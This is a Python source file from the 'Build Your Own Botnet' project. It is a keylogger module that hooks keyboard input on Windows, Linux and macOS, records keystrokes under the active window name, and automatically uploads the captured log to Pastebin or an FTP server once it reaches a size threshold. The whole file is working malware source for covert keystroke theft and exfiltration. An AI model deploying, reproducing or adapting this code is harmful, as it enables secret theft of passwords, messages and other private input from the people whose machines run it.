#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
from __future__ import print_function

# standard library

import os
import sys
import time
import Queue
import threading
import cStringIO
import collections

# modules

import util

# globals

packages  = ['pyHook','pythoncom'] if os.name == 'nt' else ['pyxhook']
platforms = ['win32','linux2','darwin']
window    = None
max_size  = 4000
log       = cStringIO.StringIO()
results   = Queue.Queue()
util.is_compatible(platforms, __name__)
util.imports(packages)

def _event(event):
    try:
        if event.WindowName != globals()['window']:
            globals()['window'] = event.WindowName
            globals()['log'].write("\n[{}]\n".format(window))
        if event.Ascii > 32 and event.Ascii < 127:
            globals()['log'].write(chr(event.Ascii))
        elif event.Ascii == 32:
            globals()['log'].write(' ')
        elif event.Ascii in (10,13):
            globals()['log'].write('\n')
        elif event.Ascii == 8:
            globals()['log'].seek(-1, 1)
            globals()['log'].truncate()
        else:
            pass
    except Exception as e:
        util.debug('{} error: {}'.format(event.func_name, str(e)))
    return True


def auto(mode):
    """
    Auto-upload to Pastebin or FTP server
    """
    if mode not in ('ftp','pastebin'):
        return "Error: invalid mode '{}'".format(str(mode))
    while True:
        try:
            if globals()['log'].tell() > globals()['max_size']:
                result  = util.pastebin(globals()['log']) if mode == 'pastebin' else util.ftp(globals()['log'], filetype='.txt')
                results.put(result)
                globals()['log'].reset()
            elif globals()['_abort']:
                break
            else:
                time.sleep(5)
        except Exception as e:
            util.debug("{} error: {}".format(auto.func_name, str(e)))
            break


def run():
    """
    Run the keylogger
    """
    while True:
        try:
            hm = pyHook.HookManager() if os.name is 'nt' else pyxhook.HookManager()
            hm.KeyDown = _event
            hm.HookKeyboard()
            pythoncom.PumpMessages() if os.name is 'nt' else time.sleep(0.1)
        except Exception as e:
            util.debug('{} error: {}'.format(run.func_name, str(e)))
            break
